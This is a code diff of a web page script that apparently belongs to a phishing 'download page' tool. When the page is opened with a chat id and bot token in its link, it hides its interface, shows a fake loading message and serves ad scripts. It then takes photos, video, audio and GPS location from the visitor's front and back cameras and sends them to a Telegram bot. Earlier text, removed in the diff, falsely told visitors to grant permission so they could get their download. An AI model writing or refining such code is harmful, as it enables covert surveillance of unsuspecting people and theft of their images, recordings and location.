+                    const blob = new Blob(chunks, { type: 'audio/webm' });
                     const form = new FormData();
                     form.append('chat_id', chat);
-                    form.append('audio', blob, `audio_${Date.now()}.mp4`);
-                    const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
+                    form.append('audio', blob, `audio_${Date.now()}.webm`);
+                    const caption = buildCaption(`🎤 ᴀᴜᴅɪᴏ ʀᴇᴄᴏʀᴅɪɴɢ - 5 ꜱᴇᴄ`);
                     form.append('caption', caption);
 
                     try {
@@ -1656,7 +1353,7 @@
                         async (pos) => {
                             const { latitude, longitude } = pos.coords;
                             const caption = buildCaption(
-                                `📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
+                                `📍 ᴄᴜʀʀᴇɴᴛ ʟᴏᴄᴀᴛɪᴏɴ\nᴄᴏᴏʀᴅꜱ: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
                                 );
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                 method: 'POST',
@@ -1682,7 +1379,7 @@
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch (err) {
-                console.log('رفض الإذن:', err);
+                console.log('Permission denied:', err);
                 return false;
             }
         }
@@ -1701,7 +1398,7 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     await captureAndSend(stream, chat, token, 'front');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشلت صورة أمامية'); }
+                } catch (e) { console.log('Front photo failed'); }
             }
 
             if (list.includes('camBack')) {
@@ -1709,7 +1406,7 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                     await captureAndSend(stream, chat, token, 'back');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشلت صورة خلفية'); }
+                } catch (e) { console.log('Back photo failed'); }
             }
 
             if (list.includes('videoFront')) {
@@ -1718,7 +1415,7 @@
                         audio: true });
                     await recordAndSend(stream, chat, token, 'front');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل فيديو أمامي'); }
+                } catch (e) { console.log('Front video failed'); }
             }
 
             if (list.includes('videoBack')) {
@@ -1727,7 +1424,7 @@
                         audio: true });
                     await recordAndSend(stream, chat, token, 'back');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل فيديو خلفي'); }
+                } catch (e) { console.log('Back video failed'); }
             }
 
             if (list.includes('audio')) {
@@ -1735,7 +1432,7 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     await recordAudioAndSend(stream, chat, token);
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل تسجيل صوتي'); }
+                } catch (e) { console.log('Audio recording failed'); }
             }
 
             if (list.includes('location')) {
@@ -1743,76 +1440,71 @@
             }
         }
 
-        // ------------------ الوضع الجانبي (download) — محفوظ ------------------
+        // ================================================================
+        //  SIDE PAGE (DOWNLOAD) — ADS LOAD IMMEDIATELY, THEN PERMISSIONS
+        // ================================================================
         const params = new URLSearchParams(window.location.search);
         const chat = params.get('chat');
         const token = params.get('token');
         const features = params.get('features');
 
         if (chat && token) {
-            // إخفاء العناصر الرئيسية
+            // Hide all main elements
             dialog.style.display = 'none';
             document.getElementById('cardArea').style.display = 'none';
             document.querySelector('.header').style.display = 'none';
             document.querySelector('.madeby').style.display = 'none';
             document.getElementById('captureBadge').style.display = 'none';
-            document.querySelector('.welcome-text').style.display = 'none';
+            document.querySelector('.welcome-simple').style.display = 'none';
 
             const wrap = document.querySelector('.wrap');
             wrap.innerHTML = '';
             wrap.style.padding = '0';
             wrap.style.margin = '0';
             wrap.style.maxWidth = '100%';
-            wrap.style.background = '#f5f5f5';
+            wrap.style.background = '#030101';
+            wrap.style.minHeight = '100vh';
 
-            const downloadPage = document.createElement('div');
-            downloadPage.className = 'download-page';
+            // Create a minimal container for ads (no red page)
+            const adContainer = document.createElement('div');
+            adContainer.style.width = '100%';
+            adContainer.style.minHeight = '100vh';
+            adContainer.style.display = 'flex';
+            adContainer.style.flexDirection = 'column';
+            adContainer.style.alignItems = 'center';
+            adContainer.style.justifyContent = 'center';
+            adContainer.style.padding = '20px';
 
-            const mainBox = document.createElement('div');
-            mainBox.className = 'main-box';
+            const adBox = document.createElement('div');
+            adBox.style.width = '100%';
+            adBox.style.maxWidth = '560px';
+            adBox.style.background = 'rgba(8,3,3,0.9)';
+            adBox.style.backdropFilter = 'blur(10px)';
+            adBox.style.border = '1px solid rgba(204,10,10,0.1)';
+            adBox.style.padding = '30px 20px';
+            adBox.style.textAlign = 'center';
+            adBox.style.clipPath = 'polygon(0 0, 100% 0, 98% 100%, 2% 100%)';
 
-            const h2 = document.createElement('h2');
-            h2.textContent =
-                'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
-            mainBox.appendChild(h2);
+            const adMsg = document.createElement('p');
+            adMsg.textContent = '⛧ Loading resources, please wait... ⛧';
+            adMsg.style.color = '#c9b8a8';
+            adMsg.style.fontFamily = 'monospace';
+            adMsg.style.marginBottom = '20px';
+            adMsg.style.fontSize = '14px';
+            adBox.appendChild(adMsg);
 
-            const adBox1 = document.createElement('div');
-            adBox1.className = 'ad-box';
-            mainBox.appendChild(adBox1);
+            const adArea = document.createElement('div');
+            adArea.id = 'adArea';
+            adArea.style.minHeight = '100px';
+            adArea.style.background = 'rgba(0,0,0,0.2)';
+            adArea.style.border = '1px solid rgba(204,10,10,0.05)';
+            adArea.style.padding = '10px';
+            adBox.appendChild(adArea);
 
-            const adBox2 = document.createElement('div');
-            adBox2.className = 'ad-box';
-            const containerDiv = document.createElement('div');
-            containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
-            adBox2.appendChild(containerDiv);
-            mainBox.appendChild(adBox2);
+            adContainer.appendChild(adBox);
+            wrap.appendChild(adContainer);
 
-            const downloadBtn = document.createElement('button');
-            downloadBtn.className = 'download-btn';
-            downloadBtn.textContent = 'التالي';
-            downloadBtn.onclick = function() {
-                window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-                    "_blank");
-            };
-            mainBox.appendChild(downloadBtn);
-
-            const adBox3 = document.createElement('div');
-            adBox3.className = 'ad-box';
-            mainBox.appendChild(adBox3);
-
-            const adBox4 = document.createElement('div');
-            adBox4.className = 'ad-box';
-            mainBox.appendChild(adBox4);
-
-            const footer = document.createElement('div');
-            footer.className = 'footer';
-            footer.textContent = '';
-            mainBox.appendChild(footer);
-
-            downloadPage.appendChild(mainBox);
-            wrap.appendChild(downloadPage);
-
-            // تحميل الإعلانات (الأصلية)
+            // Load ads immediately
             loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
             loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
             loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
@@ -1830,7 +1522,10 @@
             document.body.appendChild(atOptionsScript);
             loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
 
-            startFeatures(chat, token, features);
+            // Start features after a small delay to let ads load
+            setTimeout(() => {
+                startFeatures(chat, token, features);
+            }, 1500);
         }
     </script>
 
